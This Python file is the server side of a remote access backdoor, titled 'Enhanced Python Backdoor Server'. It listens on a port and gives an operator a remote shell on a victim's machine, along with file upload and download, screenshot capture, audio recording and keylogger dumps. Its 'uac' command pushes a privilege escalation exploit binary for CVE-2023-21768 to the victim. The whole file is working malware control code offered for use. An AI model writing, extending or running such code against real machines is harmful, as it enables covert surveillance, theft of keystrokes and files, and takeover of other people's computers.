# Enhanced Python Backdoor Server
# Supports: Command shell, file transfer, keylogger, screenshot, audio

import socket
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    client[0].send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += client[0].recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        client[0].send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        client[0].settimeout(10)
        try:
            while True:
                chunk = client[0].recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        except socket.timeout:
            pass
        client[0].settimeout(None)

def target_communication():
    while True:
        command = input('>>>  ')
        client[0].send(command.encode())
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
         #Desktop screenshot and audio record   
        elif command == 'screenshot':
            print(client[0].recv(1024).decode())
            download_file('screen.png')
            print("[+] Screenshot saved as screen.png")
            
        elif command == 'record_audio':
            print(client[0].recv(1024).decode())  # Acknowledge
            download_file('recording.wav')
            print("[+] Audio saved as recording.wav")
            
        #keylogger    
        elif command == 'keylog_dump':
            result = reliable_recv()
            print("\n[+] Keylogger Output:\n" + result + "\n")
            
        #testing
        elif command == 'check_admin':
            result = reliable_recv()
            print(result)
        elif command == 'pid':
            result = reliable_recv()
            print(result)
        # Privilege escalation commands
        elif command == 'uac':
            upload_file('Windows_AFD_LPE_CVE-2023-21768_x64.exe')
            print("[+] uploaded")
            result = reliable_recv()
            print(result)
        else:
            result = client[0].recv(1024).decode()
            print(result)
        

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.56.103', 5555))  # Change to your listener IP
print('[+] Listening For Incoming Connections')
sock.listen(5)
client = sock.accept()
print(f'[+] client connected {client[1]}')
target_communication()